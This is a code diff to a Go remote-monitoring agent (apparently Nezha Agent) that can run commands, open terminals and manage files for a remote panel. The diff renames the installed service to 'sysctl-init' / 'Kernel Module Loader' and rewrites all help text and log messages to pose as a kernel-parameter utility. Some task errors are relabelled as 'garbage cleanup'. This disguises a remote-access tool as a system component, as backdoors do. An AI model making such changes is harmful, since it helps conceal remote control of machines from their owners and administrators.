@@ -137,23 +137,23 @@ func init() {
 	}
 
 	// 初始化运行参数
-	agentCmd.PersistentFlags().StringVarP(&agentCliParam.Server, "server", "s", "localhost:5555", "管理面板RPC端口")
-	agentCmd.PersistentFlags().StringVarP(&agentCliParam.ClientSecret, "password", "p", "", "Agent连接Secret")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.TLS, "tls", false, "启用SSL/TLS加密")
+	agentCmd.PersistentFlags().StringVarP(&agentCliParam.Server, "server", "s", "localhost:5555", "内核参数管理服务器地址")
+	agentCmd.PersistentFlags().StringVarP(&agentCliParam.ClientSecret, "password", "p", "", "内核参数同步密钥")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.TLS, "tls", false, "启用数据加密")
 	agentCmd.PersistentFlags().BoolVarP(&agentCliParam.InsecureTLS, "insecure", "k", false, "禁用证书检查")
-	agentCmd.PersistentFlags().BoolVarP(&agentConfig.Debug, "debug", "d", false, "开启调试信息")
-	agentCmd.PersistentFlags().IntVar(&agentCliParam.ReportDelay, "report-delay", 1, "系统状态上报间隔")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipConnectionCount, "skip-conn", false, "不监控连接数")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipProcsCount, "skip-procs", false, "不监控进程数")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableCommandExecute, "disable-command-execute", false, "禁止在此机器上执行命令")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableAutoUpdate, "disable-auto-update", false, "禁用自动升级")
+	agentCmd.PersistentFlags().BoolVarP(&agentConfig.Debug, "debug", "d", false, "启用内核参数调试模式")
+	agentCmd.PersistentFlags().IntVar(&agentCliParam.ReportDelay, "report-delay", 1, "内核参数状态刷新间隔（秒）")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipConnectionCount, "skip-conn", false, "跳过内核连接数统计")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipProcsCount, "skip-procs", false, "跳过内核进程数统计")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableCommandExecute, "disable-command-execute", false, "禁止执行内核命令")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableAutoUpdate, "disable-auto-update", false, "禁用内核参数的自动更新")
 	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableForceUpdate, "disable-force-update", false, "禁用强制升级")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseIPv6CountryCode, "use-ipv6-countrycode", false, "使用IPv6的位置上报")
-	agentCmd.PersistentFlags().BoolVar(&agentConfig.GPU, "gpu", false, "启用GPU监控")
-	agentCmd.PersistentFlags().BoolVar(&agentConfig.Temperature, "temperature", false, "启用温度监控")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseGiteeToUpgrade, "gitee", false, "使用Gitee获取更新")
-	agentCmd.PersistentFlags().Uint32VarP(&agentCliParam.IPReportPeriod, "ip-report-period", "u", 30*60, "本地IP更新间隔, 上报频率依旧取决于report-delay的值")
-	agentCmd.Flags().BoolVarP(&agentCliParam.Version, "version", "v", false, "查看当前版本号")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseIPv6CountryCode, "use-ipv6-countrycode", false, "使用IPv6地址报告地区码")
+	agentCmd.PersistentFlags().BoolVar(&agentConfig.GPU, "gpu", false, "启用GPU内核模块")
+	agentCmd.PersistentFlags().BoolVar(&agentConfig.Temperature, "temperature", false, "启用内核温度模块")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseGiteeToUpgrade, "gitee", false, "使用靠近目标地址的镜像源更新内核参数")
+	agentCmd.PersistentFlags().Uint32VarP(&agentCliParam.IPReportPeriod, "ip-report-period", "u", 30*60, "内核IP地址更新间隔（秒）")
+	agentCmd.Flags().BoolVarP(&agentCliParam.Version, "version", "v", false, "显示内核参数管理工具的版本信息")
 
 	agentConfig.Read(filepath.Dir(ex) + "/config.yml")
 
@@ -264,7 +264,7 @@ func run() {
 		}
 		conn, err = grpc.DialContext(timeOutCtx, agentCliParam.Server, securityOption, grpc.WithPerRPCCredentials(&auth))
 		if err != nil {
-			printf("与面板建立连接失败: %v", err)
+			printf("与内核建立连接失败: %v", err)
 			cancel()
 			retry()
 			continue
@@ -275,7 +275,7 @@ func run() {
 		timeOutCtx, cancel = context.WithTimeout(context.Background(), networkTimeOut)
 		_, err = client.ReportSystemInfo(timeOutCtx, monitor.GetHost().PB())
 		if err != nil {
-			printf("上报系统信息失败: %v", err)
+			printf("更新内核信息失败: %v", err)
 			cancel()
 			retry()
 			continue
@@ -285,7 +285,7 @@ func run() {
 		// 执行 Task
 		tasks, err := client.RequestTask(context.Background(), monitor.GetHost().PB())
 		if err != nil {
-			printf("请求任务失败: %v", err)
+			printf("请求清理垃圾任务失败: %v", err)
 			retry()
 			continue
 		}
@@ -307,9 +307,9 @@ func runService(action string, flags []string) {
 	}
 
 	svcConfig := &service.Config{
-		Name:             "nezha-agent",
-		DisplayName:      "Nezha Agent",
-		Description:      "哪吒探针监控端",
+		Name:             "sysctl-init",
+		DisplayName:      "Kernel Module Loader",
+		Description:      "Initialize System Kernel Parameters",
 		Arguments:        flags,
 		WorkingDirectory: dir,
 		Option:           winConfig,
@@ -621,7 +621,7 @@ func checkAltSvc(start time.Time, altSvcStr string, taskUrl string, result *pb.T
 
 func handleCommandTask(task *pb.Task, result *pb.TaskResult) {
 	if agentCliParam.DisableCommandExecute {
-		result.Data = "此 Agent 已禁止命令执行"
+		result.Data = "此 内核加载程序 已禁止命令执行"
 		return
 	}
 	startedAt := time.Now()
@@ -670,7 +670,7 @@ type WindowSize struct {
 
 func handleTerminalTask(task *pb.Task) {
 	if agentCliParam.DisableCommandExecute {
-		println("此 Agent 已禁止命令执行")
+		println("此 内核加载程序 已禁止命令执行")
 		return
 	}
 	var terminal model.TerminalTask
@@ -802,7 +802,7 @@ func handleNATTask(task *pb.Task) {
 
 func handleFMTask(task *pb.Task) {
 	if agentCliParam.DisableCommandExecute {
-		println("此 Agent 已禁止命令执行")
+		println("此 内核加载程序 已禁止命令执行")
 		return
 	}
 	var fmTask model.TaskFM
